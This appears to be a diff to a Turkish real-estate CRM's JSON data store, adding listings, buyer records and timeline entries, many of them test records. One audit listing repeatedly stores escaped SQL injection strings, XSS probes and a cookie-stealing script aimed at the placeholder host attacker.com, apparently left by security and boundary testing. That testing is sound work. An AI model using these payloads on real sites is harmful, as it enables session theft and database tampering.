@@ -2482,6 +2482,39 @@
     ],
     "buyers": [
       {
+        "id": "b_1793524730_805",
+        "refId": "test_no_phone_persist",
+        "name": "Mehmet Bey (Cinnah Adayı)",
+        "phone": "-",
+        "offer": "7.200.000 ₺",
+        "stage": "Pazarlık Aşamasında",
+        "note": "Telefon girmeden sadece isim ve teklif ile ekleme testi.",
+        "listingTitle": "CİNNAHTA CADDE CEPHELİ 2+1 DAİRE",
+        "createdAt": "01.11.2026 12:18"
+      },
+      {
+        "id": "b_1793518271_262",
+        "refId": "test_no_phone_persist",
+        "name": "Mehmet Bey (Cinnah Adayı)",
+        "phone": "-",
+        "offer": "7.200.000 ₺",
+        "stage": "Pazarlık Aşamasında",
+        "note": "Telefon girmeden sadece isim ve teklif ile ekleme testi.",
+        "listingTitle": "CİNNAHTA CADDE CEPHELİ 2+1 DAİRE",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793517739_383",
+        "refId": "test_no_phone_persist",
+        "name": "Mehmet Bey (Cinnah Adayı)",
+        "phone": "-",
+        "offer": "7.200.000 ₺",
+        "stage": "Pazarlık Aşamasında",
+        "note": "Telefon girmeden sadece isim ve teklif ile ekleme testi.",
+        "listingTitle": "CİNNAHTA CADDE CEPHELİ 2+1 DAİRE",
+        "createdAt": "01.11.2026 10:22"
+      },
+      {
         "id": "b_1793517459_679",
         "refId": "test_no_phone_persist",
         "name": "Mehmet Bey (Cinnah Adayı)",
@@ -2538,6 +2571,30 @@
       }
     ],
     "timeline": [
+      {
+        "id": "t_1793524730",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Mehmet Bey (Cinnah Adayı)",
+        "note": "Teklif: 7.200.000 ₺ | Aşama: Pazarlık Aşamasında",
+        "date": "01.11.2026 12:18",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518271",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Mehmet Bey (Cinnah Adayı)",
+        "note": "Teklif: 7.200.000 ₺ | Aşama: Pazarlık Aşamasında",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793517739",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Mehmet Bey (Cinnah Adayı)",
+        "note": "Teklif: 7.200.000 ₺ | Aşama: Pazarlık Aşamasında",
+        "date": "01.11.2026 10:22",
+        "author": "Yiğit Narin"
+      },
       {
         "id": "t_1793517459",
         "type": "buyer",
@@ -2928,6 +2985,2424 @@
         "title": "Yeni Alıcı Eklendi: Ahmet Yılmaz (Test Alıcı)",
         "note": "Teklif: 14.500.000 ₺ | Aşama: Teklif Verildi",
         "date": "01.11.2026 10:17",
+        "author": "Yiğit Narin"
+      }
+    ]
+  },
+  "test_listing_1793517738": {
+    "refId": "test_listing_1793517738",
+    "platform_stats": [
+      {
+        "platform": "SAHIBINDEN",
+        "logo": "🟡",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "HEPSIEMLAK",
+        "logo": "🔴",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "EMLAKJET",
+        "logo": "🟣",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "COLDWELL BANKER",
+        "logo": "🔵",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "BRANDA / AFİŞ",
+        "logo": "🟠",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "SOSYAL MEDYA & AD",
+        "logo": "🟢",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      }
+    ],
+    "buyers": [
+      {
+        "id": "b_1793517738_528",
+        "refId": "test_listing_1793517738",
+        "name": "Ahmet Yılmaz (Test Alıcı)",
+        "phone": "+90 532 999 88 77",
+        "offer": "14.500.000 ₺",
+        "stage": "Teklif Verildi",
+        "note": "Alıcı test notu: Villa ile çok ilgilendi.",
+        "listingTitle": "Beytepe 4+1 Özel Bahçeli Villa",
+        "createdAt": "01.11.2026 10:22"
+      }
+    ],
+    "timeline": [
+      {
+        "id": "t_1793517738",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Ahmet Yılmaz (Test Alıcı)",
+        "note": "Teklif: 14.500.000 ₺ | Aşama: Teklif Verildi",
+        "date": "01.11.2026 10:22",
+        "author": "Yiğit Narin"
+      }
+    ]
+  },
+  "test_audit_listing_101": {
+    "refId": "test_audit_listing_101",
+    "platform_stats": [
+      {
+        "platform": "SAHIBINDEN",
+        "logo": "🟡",
+        "views": 1500,
+        "favorites": 45,
+        "messages": 12,
+        "calls": 8,
+        "influence": 90,
+        "score": 3905
+      },
+      {
+        "platform": "HEPSIEMLAK",
+        "logo": "🔴",
+        "views": 800,
+        "favorites": 20,
+        "messages": 5,
+        "calls": 3,
+        "influence": 70,
+        "score": 2450
+      },
+      {
+        "platform": "EMLAKJET",
+        "logo": "🟣",
+        "views": 400,
+        "favorites": 10,
+        "messages": 2,
+        "calls": 1,
+        "influence": 50,
+        "score": 1505
+      },
+      {
+        "platform": "COLDWELL BANKER",
+        "logo": "🔵",
+        "views": 950,
+        "favorites": 30,
+        "messages": 15,
+        "calls": 10,
+        "influence": 95,
+        "score": 3475
+      },
+      {
+        "platform": "BRANDA / AFİŞ",
+        "logo": "🟠",
+        "views": 300,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 5,
+        "influence": 40,
+        "score": 1225
+      },
+      {
+        "platform": "SOSYAL MEDYA & AD",
+        "logo": "🟢",
+        "views": 4200,
+        "favorites": 120,
+        "messages": 25,
+        "calls": 14,
+        "influence": 85,
+        "score": 7225
+      }
+    ],
+    "buyers": [],
+    "timeline": [
+      {
+        "id": "t_1793518248",
+        "type": "showing",
+        "title": "Müşteri Yer Gösterme Ziyareti Gerçekleşti",
+        "note": "İncek bölgesindeki yatırımcı ile villa yerinde incelendi. Bahçe peyzajı beğenildi.",
+        "date": "01.11.2026 10:30",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518152",
+        "type": "showing",
+        "title": "Müşteri Yer Gösterme Ziyareti Gerçekleşti",
+        "note": "İncek bölgesindeki yatırımcı ile villa yerinde incelendi. Bahçe peyzajı beğenildi.",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518000",
+        "type": "showing",
+        "title": "Müşteri Yer Gösterme Ziyareti Gerçekleşti",
+        "note": "İncek bölgesindeki yatırımcı ile villa yerinde incelendi. Bahçe peyzajı beğenildi.",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "init",
+        "type": "status",
+        "title": "Portföy CRM'e Eklendi",
+        "note": "İlan sisteme başarıyla tanımlandı ve takibe alındı.",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      }
+    ],
+    "updatedAt": "2026-11-01T10:30:48.925598"
+  },
+  "audit_boundary_listing_202": {
+    "refId": "audit_boundary_listing_202",
+    "platform_stats": [
+      {
+        "platform": "SAHIBINDEN",
+        "logo": "🟡",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "HEPSIEMLAK",
+        "logo": "🔴",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "EMLAKJET",
+        "logo": "🟣",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "COLDWELL BANKER",
+        "logo": "🔵",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "BRANDA / AFİŞ",
+        "logo": "🟠",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "SOSYAL MEDYA & AD",
+        "logo": "🟢",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      }
+    ],
+    "buyers": [
+      {
+        "id": "b_1793518262_369",
+        "refId": "audit_boundary_listing_202",
+        "name": "Massive Payload Buyer AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "phone": "+90 532 000 00 00",
+        "offer": "50.000.000 ₺",
+        "stage": "Büyük Veri",
+        "note": "NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518261_333",
+        "refId": "audit_boundary_listing_202",
+        "name": "SQLi Test&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --",
+        "phone": "+90 532 999 00 00&#x27;; DROP TABLE",
+        "offer": "10.000.000 ₺&#x27; UNION SELECT 1,2,3,4,5,6,7,8,9 --",
+        "stage": "Pazarlık&#x27; OR 1=1 --",
+        "note": "SQL Injection probe payload testing parameterized SQLite safety.",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518260_583",
+        "refId": "audit_boundary_listing_202",
+        "name": "&lt;script&gt;alert(&#x27;XSS_ATTACK_NAME&#x27;)&lt;/script&gt;",
+        "phone": "&quot;&gt;&lt;svg onload=alert(&#x27;XSS_PHONE",
+        "offer": "15.000.000 ₺&lt;iframe src=&#x27;javascript:alert(1)&#x27;&gt;",
+        "stage": "Yeni Talep&lt;img src=x onerror=alert(&#x27;XSS_STAGE&#x27;)&gt;",
+        "note": "XSS Note: &lt;script&gt;document.location=&#x27;http://attacker.com?c=&#x27;+document.cookie&lt;/script&gt;",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:31"
+      },
+      {
+        "id": "b_1793518259_678",
+        "refId": "audit_boundary_listing_202",
+        "name": "Extreme Tester (Non-numeric String Offer (&#x27;Kat Karşılığı &amp; Takas&#x27;))",
+        "phone": "+90 532 111 22 33",
+        "offer": "Kat Karşılığı &amp; Takas",
+        "stage": "Teklif Testi",
+        "note": "Extreme test case: Non-numeric String Offer (&#x27;Kat Karşılığı &amp; Takas&#x27;)",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:30"
+      },
+      {
+        "id": "b_1793518258_237",
+        "refId": "audit_boundary_listing_202",
+        "name": "Extreme Tester (Massive Offer (999.999.999.999 ₺))",
+        "phone": "+90 532 111 22 33",
+        "offer": "999.999.999.999 ₺",
+        "stage": "Teklif Testi",
+        "note": "Extreme test case: Massive Offer (999.999.999.999 ₺)",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:30"
+      },
+      {
+        "id": "b_1793518257_710",
+        "refId": "audit_boundary_listing_202",
+        "name": "Extreme Tester (Negative Offer (-5.000.000 ₺))",
+        "phone": "+90 532 111 22 33",
+        "offer": "-5.000.000 ₺",
+        "stage": "Teklif Testi",
+        "note": "Extreme test case: Negative Offer (-5.000.000 ₺)",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:30"
+      },
+      {
+        "id": "b_1793518257_631",
+        "refId": "audit_boundary_listing_202",
+        "name": "Extreme Tester (0 TL Zero Offer)",
+        "phone": "+90 532 111 22 33",
+        "offer": "0 ₺",
+        "stage": "Teklif Testi",
+        "note": "Extreme test case: 0 TL Zero Offer",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:30"
+      },
+      {
+        "id": "b_1793518256_898",
+        "refId": "audit_boundary_listing_202",
+        "name": "Telefon Vermeyen Gizli Yatırımcı",
+        "phone": "-",
+        "offer": "35.000.000 ₺",
+        "stage": "Gizli Teklif",
+        "note": "Sadece e-posta ve temsilci üzerinden iletişim.",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:30"
+      },
+      {
+        "id": "b_1793518255_420",
+        "refId": "audit_boundary_listing_202",
+        "name": "Ömer Şafak Çelik (İncek &amp; Ümitköy Adayı)",
+        "phone": "+90 (532) 123-4567",
+        "offer": "19.750.000 ₺",
+        "stage": "Pazarlık Aşaması (Şentepe &amp; Çankaya)",
+        "note": "Türkçe harfler: ç, ğ, ı, ö, ş, ü / Ç, Ğ, İ, Ö, Ş, Ü. Özel simgeler: ₺, €, $, @, %, &amp;, +, #",
+        "listingTitle": "ÇANKAYA GAZİOSMANPAŞA KÖŞE BAŞI VİLLA",
+        "createdAt": "01.11.2026 10:30"
+      },
+      {
+        "id": "b_1793518166_670",
+        "refId": "audit_boundary_listing_202",
+        "name": "Massive Payload Buyer AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "phone": "+90 532 000 00 00",
+        "offer": "50.000.000 ₺",
+        "stage": "Büyük Veri",
+        "note": "NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518165_169",
+        "refId": "audit_boundary_listing_202",
+        "name": "SQLi Test&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --",
+        "phone": "+90 532 999 00 00&#x27;; DROP TABLE",
+        "offer": "10.000.000 ₺&#x27; UNION SELECT 1,2,3,4,5,6,7,8,9 --",
+        "stage": "Pazarlık&#x27; OR 1=1 --",
+        "note": "SQL Injection probe payload testing parameterized SQLite safety.",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518164_136",
+        "refId": "audit_boundary_listing_202",
+        "name": "&lt;script&gt;alert(&#x27;XSS_ATTACK_NAME&#x27;)&lt;/script&gt;",
+        "phone": "&quot;&gt;&lt;svg onload=alert(&#x27;XSS_PHONE",
+        "offer": "15.000.000 ₺&lt;iframe src=&#x27;javascript:alert(1)&#x27;&gt;",
+        "stage": "Yeni Talep&lt;img src=x onerror=alert(&#x27;XSS_STAGE&#x27;)&gt;",
+        "note": "XSS Note: &lt;script&gt;document.location=&#x27;http://attacker.com?c=&#x27;+document.cookie&lt;/script&gt;",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518163_457",
+        "refId": "audit_boundary_listing_202",
+        "name": "Extreme Tester (Non-numeric String Offer (&#x27;Kat Karşılığı &amp; Takas&#x27;))",
+        "phone": "+90 532 111 22 33",
+        "offer": "Kat Karşılığı &amp; Takas",
+        "stage": "Teklif Testi",
+        "note": "Extreme test case: Non-numeric String Offer (&#x27;Kat Karşılığı &amp; Takas&#x27;)",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518163_594",
+        "refId": "audit_boundary_listing_202",
+        "name": "Extreme Tester (Massive Offer (999.999.999.999 ₺))",
+        "phone": "+90 532 111 22 33",
+        "offer": "999.999.999.999 ₺",
+        "stage": "Teklif Testi",
+        "note": "Extreme test case: Massive Offer (999.999.999.999 ₺)",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518162_135",
+        "refId": "audit_boundary_listing_202",
+        "name": "Extreme Tester (Negative Offer (-5.000.000 ₺))",
+        "phone": "+90 532 111 22 33",
+        "offer": "-5.000.000 ₺",
+        "stage": "Teklif Testi",
+        "note": "Extreme test case: Negative Offer (-5.000.000 ₺)",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518161_881",
+        "refId": "audit_boundary_listing_202",
+        "name": "Extreme Tester (0 TL Zero Offer)",
+        "phone": "+90 532 111 22 33",
+        "offer": "0 ₺",
+        "stage": "Teklif Testi",
+        "note": "Extreme test case: 0 TL Zero Offer",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518160_762",
+        "refId": "audit_boundary_listing_202",
+        "name": "Telefon Vermeyen Gizli Yatırımcı",
+        "phone": "-",
+        "offer": "35.000.000 ₺",
+        "stage": "Gizli Teklif",
+        "note": "Sadece e-posta ve temsilci üzerinden iletişim.",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518159_821",
+        "refId": "audit_boundary_listing_202",
+        "name": "Ömer Şafak Çelik (İncek &amp; Ümitköy Adayı)",
+        "phone": "+90 (532) 123-4567",
+        "offer": "19.750.000 ₺",
+        "stage": "Pazarlık Aşaması (Şentepe &amp; Çankaya)",
+        "note": "Türkçe harfler: ç, ğ, ı, ö, ş, ü / Ç, Ğ, İ, Ö, Ş, Ü. Özel simgeler: ₺, €, $, @, %, &amp;, +, #",
+        "listingTitle": "ÇANKAYA GAZİOSMANPAŞA KÖŞE BAŞI VİLLA",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518012_548",
+        "refId": "audit_boundary_listing_202",
+        "name": "Massive Payload Buyer AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "phone": "+90 532 000 00 00",
+        "offer": "50.000.000 ₺",
+        "stage": "Büyük Veri",
+        "note": "NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS_AUDIT_DATA_NEXA_STRESS",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518011_981",
+        "refId": "audit_boundary_listing_202",
+        "name": "SQLi Test&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --",
+        "phone": "+90 532 999 00 00&#x27;; DROP TABLE",
+        "offer": "10.000.000 ₺&#x27; UNION SELECT 1,2,3,4,5,6,7,8,9 --",
+        "stage": "Pazarlık&#x27; OR 1=1 --",
+        "note": "SQL Injection probe payload testing parameterized SQLite safety.",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518010_109",
+        "refId": "audit_boundary_listing_202",
+        "name": "&lt;script&gt;alert(&#x27;XSS_ATTACK_NAME&#x27;)&lt;/script&gt;",
+        "phone": "&quot;&gt;&lt;svg onload=alert(&#x27;XSS_PHONE",
+        "offer": "15.000.000 ₺&lt;iframe src=&#x27;javascript:alert(1)&#x27;&gt;",
+        "stage": "Yeni Talep&lt;img src=x onerror=alert(&#x27;XSS_STAGE&#x27;)&gt;",
+        "note": "XSS Note: &lt;script&gt;document.location=&#x27;http://attacker.com?c=&#x27;+document.cookie&lt;/script&gt;",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518009_425",
+        "refId": "audit_boundary_listing_202",
+        "name": "Extreme Tester (Non-numeric String Offer (&#x27;Kat Karşılığı &amp; Takas&#x27;))",
+        "phone": "+90 532 111 22 33",
+        "offer": "Kat Karşılığı &amp; Takas",
+        "stage": "Teklif Testi",
+        "note": "Extreme test case: Non-numeric String Offer (&#x27;Kat Karşılığı &amp; Takas&#x27;)",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518009_477",
+        "refId": "audit_boundary_listing_202",
+        "name": "Extreme Tester (Massive Offer (999.999.999.999 ₺))",
+        "phone": "+90 532 111 22 33",
+        "offer": "999.999.999.999 ₺",
+        "stage": "Teklif Testi",
+        "note": "Extreme test case: Massive Offer (999.999.999.999 ₺)",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518008_414",
+        "refId": "audit_boundary_listing_202",
+        "name": "Extreme Tester (Negative Offer (-5.000.000 ₺))",
+        "phone": "+90 532 111 22 33",
+        "offer": "-5.000.000 ₺",
+        "stage": "Teklif Testi",
+        "note": "Extreme test case: Negative Offer (-5.000.000 ₺)",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518007_713",
+        "refId": "audit_boundary_listing_202",
+        "name": "Extreme Tester (0 TL Zero Offer)",
+        "phone": "+90 532 111 22 33",
+        "offer": "0 ₺",
+        "stage": "Teklif Testi",
+        "note": "Extreme test case: 0 TL Zero Offer",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518007_734",
+        "refId": "audit_boundary_listing_202",
+        "name": "Telefon Vermeyen Gizli Yatırımcı",
+        "phone": "-",
+        "offer": "35.000.000 ₺",
+        "stage": "Gizli Teklif",
+        "note": "Sadece e-posta ve temsilci üzerinden iletişim.",
+        "listingTitle": "Portföy İlanı",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518006_827",
+        "refId": "audit_boundary_listing_202",
+        "name": "Ömer Şafak Çelik (İncek &amp; Ümitköy Adayı)",
+        "phone": "+90 (532) 123-4567",
+        "offer": "19.750.000 ₺",
+        "stage": "Pazarlık Aşaması (Şentepe &amp; Çankaya)",
+        "note": "Türkçe harfler: ç, ğ, ı, ö, ş, ü / Ç, Ğ, İ, Ö, Ş, Ü. Özel simgeler: ₺, €, $, @, %, &amp;, +, #",
+        "listingTitle": "ÇANKAYA GAZİOSMANPAŞA KÖŞE BAŞI VİLLA",
+        "createdAt": "01.11.2026 10:26"
+      }
+    ],
+    "timeline": [
+      {
+        "id": "t_1793518262",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Massive Payload Buyer AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "note": "Teklif: 50.000.000 ₺ | Aşama: Büyük Veri",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518261",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: SQLi Test&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --",
+        "note": "Teklif: 10.000.000 ₺&#x27; UNION SELECT 1,2,3,4,5,6,7,8,9 -- | Aşama: Pazarlık&#x27; OR 1=1 --",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518260",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: &lt;script&gt;alert(&#x27;XSS_ATTACK_NAME&#x27;)&lt;/script&gt;",
+        "note": "Teklif: 15.000.000 ₺&lt;iframe src=&#x27;javascript:alert(1)&#x27;&gt; | Aşama: Yeni Talep&lt;img src=x onerror=alert(&#x27;XSS_STAGE&#x27;)&gt;",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518259",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Extreme Tester (Non-numeric String Offer (&#x27;Kat Karşılığı &amp; Takas&#x27;))",
+        "note": "Teklif: Kat Karşılığı &amp; Takas | Aşama: Teklif Testi",
+        "date": "01.11.2026 10:30",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518258",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Extreme Tester (Massive Offer (999.999.999.999 ₺))",
+        "note": "Teklif: 999.999.999.999 ₺ | Aşama: Teklif Testi",
+        "date": "01.11.2026 10:30",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518257",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Extreme Tester (Negative Offer (-5.000.000 ₺))",
+        "note": "Teklif: -5.000.000 ₺ | Aşama: Teklif Testi",
+        "date": "01.11.2026 10:30",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518257",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Extreme Tester (0 TL Zero Offer)",
+        "note": "Teklif: 0 ₺ | Aşama: Teklif Testi",
+        "date": "01.11.2026 10:30",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518256",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Telefon Vermeyen Gizli Yatırımcı",
